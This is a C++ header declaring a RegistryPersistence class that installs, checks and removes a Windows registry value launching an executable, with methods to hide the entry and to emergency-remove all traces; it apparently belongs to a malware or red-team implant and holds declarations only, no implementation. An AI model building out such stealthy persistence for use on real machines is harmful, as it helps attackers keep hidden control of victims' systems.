// File: RegistryPersistence.h
#pragma once

#include "core/Logger.h"
#include <string>
#include <windows.h>

namespace persistence {

class RegistryPersistence {
public:
    enum class RegistryHive {
        HKCU,
        HKLM,
        HKU
    };

    RegistryPersistence(std::shared_ptr<core::Logger> logger);
    ~RegistryPersistence() = default;

    // Delete copy constructor and assignment operator
    RegistryPersistence(const RegistryPersistence&) = delete;
    RegistryPersistence& operator=(const RegistryPersistence&) = delete;

    /**
     * @brief Installs registry persistence
     * @param hive Registry hive to use
     * @param keyPath Registry key path
     * @param valueName Value name for the executable
     * @param executablePath Path to the executable
     * @return true if installation successful
     */
    bool install(RegistryHive hive, const std::string& keyPath,
                const std::string& valueName, const std::string& executablePath);

    /**
     * @brief Removes registry persistence
     * @param hive Registry hive where persistence was installed
     * @param keyPath Registry key path
     * @param valueName Value name to remove
     * @return true if removal successful
     */
    bool remove(RegistryHive hive, const std::string& keyPath,
               const std::string& valueName);

    /**
     * @brief Checks if registry persistence exists
     * @param hive Registry hive to check
     * @param keyPath Registry key path
     * @param valueName Value name to check
     * @return true if persistence exists
     */
    bool exists(RegistryHive hive, const std::string& keyPath,
               const std::string& valueName) const;

    /**
     * @brief Attempts to hide registry entry (optional)
     */
    bool hideEntry(RegistryHive hive, const std::string& keyPath);

    /**
     * @brief Emergency removal of all known registry entries
     */
    void emergencyRemove();

private:
    /**
     * @brief Converts RegistryHive to HKEY
     */
    HKEY hiveToHKEY(RegistryHive hive) const;

    /**
     * @brief Opens registry key with appropriate permissions
     */
    bool openKey(HKEY hive, const std::string& subKey, REGSAM permissions,
                HKEY& resultKey, bool createIfMissing = false) const;

    std::shared_ptr<core::Logger> logger_;
};

} // namespace persistence